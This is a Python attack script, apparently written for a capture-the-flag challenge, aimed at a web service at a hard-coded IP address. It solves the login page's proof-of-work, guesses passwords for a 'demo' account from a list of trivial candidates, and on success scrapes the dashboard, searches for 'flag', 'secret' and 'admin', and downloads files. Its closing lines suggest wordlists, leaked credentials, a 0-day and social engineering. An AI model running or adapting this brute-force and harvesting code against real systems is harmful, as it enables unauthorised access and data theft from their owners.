#!/usr/bin/env python3
"""
FINAL DESPERATE HACK - Try EVERYTHING
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import string

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow(challenge):
    target = 2 ** (256 - 18)
    for nonce in range(300000):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
    return None

def try_login(username, password, challenge, nonce):
    data = {
        'pow_challenge': challenge,
        'pow_nonce': str(nonce),
        'username': username,
        'password': password
    }
    session = requests.Session()
    resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    
    if resp.status_code == 302:
        print(f"\n{'='*60}")
        print(f"[!!!] CRACKED: {username}:{password}")
        print(f"{'='*60}")
        
        # Get everything
        dash = session.get(f"{BASE_URL}/dashboard")
        print(f"\nDashboard:\n{dash.text[:1000]}")
        
        search = session.get(f"{BASE_URL}/api/search")
        print(f"\nAPI Search:\n{search.text}")
        
        for q in ['', 'flag', 'Kaal', '*', 'all', 'documents', 'files', 'secret', 'admin']:
            r = session.get(f"{BASE_URL}/api/search", params={'q': q})
            if r.text and len(r.text) > 2:
                print(f"\nSearch q={q}:\n{r.text}")
        
        for i in range(1, 10):
            r = session.get(f"{BASE_URL}/download/{i}")
            if r.status_code == 200:
                print(f"\nDownload {i}:\n{r.text[:500]}")
        
        return True
    return False

print("="*60)
print("FINAL DESPERATE HACK")
print("="*60)

resp = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(resp.text, 'html.parser')
challenge = soup.find('input', {'name': 'pow_challenge'})['value']

print(f"[*] Solving PoW...")
nonce = solve_pow(challenge)
print(f"[+] Solved: {nonce}")

# Try SUPER simple passwords
ultra_simple = [
    # Literally nothing
    '',
    
    # Single characters
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    
    # Two characters
    'aa', 'ab', 'ad', 'qv', 'QV',
    '00', '01', '11', '12', '99',
    
    # Three characters
    'aaa', 'abc', 'qvi', 'QVI',
    '000', '111', '123', '999',
    
    # Four characters
    'demo', 'Demo', 'DEMO',
    'test', 'Test', 'TEST',
    'pass', 'Pass', 'PASS',
    'user', 'User', 'USER',
    '0000', '1111', '1234', '9999',
    
    # Five characters
    'admin', 'Admin', 'ADMIN',
    'guest', 'Guest', 'GUEST',
    'vault', 'Vault', 'VAULT',
    '00000', '11111', '12345',
    
    # Six characters
    'quantum', 'Quantum', 'QUANTUM',
    'secret', 'Secret', 'SECRET',
    '000000', '111111', '123456',
    
    # Seven+ characters
    'password', 'Password', 'PASSWORD',
    'quantumvault', 'QuantumVault',
    '1234567', '12345678',
]

print(f"\n[*] Trying {len(ultra_simple)} ultra-simple passwords...")

for i, pwd in enumerate(ultra_simple):
    if i % 10 == 0:
        print(f"  Progress: {i}/{len(ultra_simple)}")
    
    if try_login('demo', pwd, challenge, nonce):
        exit(0)

print("\n[-] Still no luck!")
print("[!] This challenge might require:")
print("    1. A specific wordlist (rockyou.txt)")
print("    2. Finding leaked credentials elsewhere")
print("    3. Exploiting a 0-day vulnerability")
print("    4. Social engineering / OSINT")
